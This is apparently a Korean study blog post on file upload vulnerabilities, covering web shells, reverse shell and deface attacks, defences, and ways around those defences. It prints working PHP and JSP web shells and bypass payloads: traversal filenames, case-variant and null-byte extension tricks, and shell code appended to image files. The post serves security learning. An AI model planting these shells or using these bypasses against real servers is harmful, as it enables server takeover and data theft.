---
title: "File Upload 공격 세부 정리"
excerpt: "File Upload 공격에 대하여 자세히 알아보자."
tags:
    - file upload
    - 웹쉘
last_modified_at: 2023-06-05T09:13:00-05:00
---
## File Upload 공격이란?
- 공격자가 임의의 파일을 업로드할 수 있는 공격이다.
- 웹쉘을 서버에 업로드하여 서버를 장악할 수 있다.

## 웹쉘 이란?
- 서버측에서 실행될 수 있는 코드이다.
- php, jsp, asp, python 등이 있다. 서버의 환경에 따라 달라진다.
- 서버환경에 맞게 웹 쉘을 제작하여야 한다.


### PHP 웹 쉘

```php
<?php echo system($_GET['cmd']); ?>
```

### JSP 웹 쉘

```jsp
<%@ page import="java.io.*" %>
<%
try {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    int c;
    while((c=in.read())!=-1){
        out.print((char)c);
    }
    in.close();
    try {
        p.waitFor();
    }catch(Exception e){
        out.println(e.getMessage());
    }
}catch(Exception e){
    out.println(e.getMessage());
}
%>
```

## 공격 성공을 위한 중요 Point!
- 공격자는 웹 서버에서 동작할 수 있는 파일을 올릴 수 있어야한다. (  jsp, php, asp, python 등등 )
- 공격자는 업로드한 파일을 실행시킬 수 있어야한다.

## 공격 유형

### 소스코드 탈취
- 소스코드 안에 DB의 계정정보가 적혀있을 수 있다. ( DB 서버 아이디 , 비밀번호 ) 이러한 정보들을 통해 서버의 DB 데이터를 탈취하는 것이다.

### Reverse Shelll
- 웹 서버에서 공격자의 특정 포트와 연결하는 공격이다.
- 방화벽으로 외부(공격자)에서 서버로 들어오는 요청은 잘 막혀있다. ( ip and port number )
- 하지만 서버에서 외부(공격자) 즉 나가는 포트는 잘 안막혀 있다. 왜냐하면 외부 API가 어떤 포트를 사용하는지 모르기 때문이다. 443 ( https ) 포트는 항상 열려있을 가능성이 높다.

### Deface 공격
- 화면 변조 공격이다.
- 공격자가 웹 서버를 마음로 바꾸고 해킹을 성공했음을 알리는 공격이다. 해킹을 성공했다는 실력 과시로 활용된다.
- 해당 공격을 당했을 때 서버의 피해는 심각하지 않다. 하지만 웹 서버의 보안이 취약하다는 뜻이다.



## File Upload 공격 방어법

### 파일 업로드 위치
- 파일 업로드 위치를 웹 서버와 물리적으로 분리시켜 준다. 
- 공격자는 웹 링크를 통해 서버에 업로드한 파일에 접속할 수 없다.

### 업로드 폴더 실행 막기
- 특정 폴더에서 웹 서버에서 실행되는 코드의 실행을 막는 것이다.
- 공격자가 업로드한 파일( 웹쉘 )에 링크를 통해 직접적으로 접근이 가능해도 서버측에서는 해당 파일을 실행하지 않고 파일 내용 그대로를 보여주게 된다.

### 웹 서버 계정 접근 권한 
- 웹 서버 계정의 접근 권한을 제한하기.
- 외부에서 웹 쉘 공격을 성공하여도 웹 계정은 접근 권한이 없어 다른 곳으로 접근을 못한다.

### Content-Type 검사
- 서버에서 업로드 파일의 업로드 요청이 올 때 **Content-Type**을 검사하여 서버에 저장하여도 괜찮은 파일인지 확인한다.

```
php 파일
content-type: text/php

이미지 파일
content-type: image/jpeg
```

### 확장자 필터링
- 서버에서 허용되지 않은 확장자 파일이 업로드 되면 서버에 저장하지 않는다. 즉 업로드에 실패하게 된다.
- 예를들어 파일 확장자가 `.jpeg` , `.png` 인 것만 서버 저장을 허용 한다고 설정하는 것이다.


### File 시그니쳐 검사
- 업로드된 파일의 시그니처를 검사하여 허용된 파일 인지 아닌지 확인한다. 이런 확인을 통해 허용된 파일이면 서버에 저장하고 허용되지 않은 파일이면 저장하지 않는다.



## 방어법 Bypass

### Content-Type 바꾸기
- 직접 content-type을 서버에서 허용하는 값으로 바꾸어 서버에서 정상적인 파일이 업로드되고 있다고 생각하게 한다.
- burp-suite의 intercept 기능을 이용하여 실제 업로드 하는 파일은 이미지가 아니지만 content-type을 공격자가 임의로 변경하여 정상적인 이미지 파일을 업로드하는 것으로 서버를 속일 수 있다.<br>![Pasted image 20230605174255](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/72120adb-5190-48a9-a615-b77f644698b4)<br>![Pasted image 20230605174427](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3358a51e-29ad-4bad-90df-16379e7d796d)<br>![Pasted image 20230605174447](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/56ade12a-3454-47f8-9acf-58be232d8b35)<br>![Pasted image 20230605174534](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0f9dd0c8-2173-4141-9aa4-9e2afab9ab6a)

### Traversal
- 파일이 업로드되는 경로를 사용자가 임의로 바꾼다.
- 만약 서버가 업로드 폴더에 저장된 업로드 파일 실행이 안되게 막아 놓는다면 공격자는 업로드 폴더에 바로 접근이 가능하더라도 웹 쉘 공격을 성공시킬 수 없다.
- 업로드 파일 이름을 바꾸어 파일 저장 위치를 공격자가 임의로 바꾼다. 공격자가 링크를 통해 바로 접근가능 하면서 파일 실행이 되는 임의의 위치로 설정한다.

```
업로드 파일 이름
test.img

traversal 을 이용한 파일 이름
../test.img
```

- 정상적으로 파일 업로드 하였을 때 파일 저장 위치.<br>![Pasted image 20230605183831](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c4d514ea-6685-4089-be49-c216697604c1)<br>![Pasted image 20230605183720](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/53f07950-06a8-426d-afb5-054230bb1628)

- 파일 이름을 변경하여 임의로 업로드 위치 바꾸기. 저장되면 원래 위치의 하위 폴더에 공격자가 업로드한 파일이 저장되었다.<br>![Pasted image 20230605183905](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/63ff038d-b4bb-41cd-947d-3f57f0d6037f)<br>![Pasted image 20230605184010](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2519f6cf-7952-4d70-b0b2-df817bb16c94)<br>![Pasted image 20230605184041](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b863d87-6983-4aa4-90fc-c50ea70622ab)


### 블랙리스트 기반 필터링 우회
- 필터링 처리되어 있는 단어를 대소문자로 바꿔가며 우회되는지 확인한다.

```
php 가 필터링 처리되어 있으면
pHp
PhP
pHP

jsp
Jsp
jsP
JsP
```


- 필터링으로 설정된 단어를 빈칸으로 변경하는 서버에서는 필터링 단어를 한번더 써주어 우회를 시도한다.

```
phphpp => php
```


### 확장자 우회 방법
- 서버가 앞에서 부터 확장자를 검사할 때.

```
test.jpeg.php
```

- 서버가 뒤에서 부터 확장자를 검사할 때. null 바이트를 이용하기.

```
%00 : null 바이트
test.php%00.jpeg : 리눅스

test.php:.jpeg : 윈도우
```

- 다른 확장자명 사용하기.

```
php > .php5
jsp > .jspx ( .jsp 와 문법이 다르다. )
```


### File 시그니처 우회방법
- 허용된 파일 내용 맨뒤에 웹쉘 코드를 넣어주기. 즉 이미지 안에 웹쉘 코드를 넣는 것이다.

```
~PNG
....

웹 쉘 코드 넣기.
```



## 후기
- 파일 업로드 취약점이 무엇인지 관하여 알아보았고, 파일 업로드 취약점을 이용한 공격이 어떠한 것들이 있는지 알아보았다. 방어법과 방어법 우회 방법도 알아보았다. 리버스 쉘과 deface 라는 처음보는 공격방식에 대하여 알아보는 좋은 계기가 되었다.
- 파일 업로드 공격을 정리하면서 내가 만든 웹 서버의 파일 업로드 부분에 취약점이 있는지 확인해 보았다. 파일 업로드 부분에 취약점이 없을 줄 알았지만 Traversal 우회기법을 사용하여 업로드 파일 저장위치를 변경할 수 있는 취약점을 발견할 수 있었다. 따라서 다음 글에는 이 취약점을 이용하여 deface 공격 이나 리버스쉘 공격을 실습을 통해 정리해볼 예정이다.

## 참고 사이트
- [Null byte (tistory.com)](https://mokpo.tistory.com/355)
- [왕초보를 위한 용어 풀이, 디페이스(Deface) 공격이란? (boannews.com)](https://www.boannews.com/media/view.asp?idx=55936)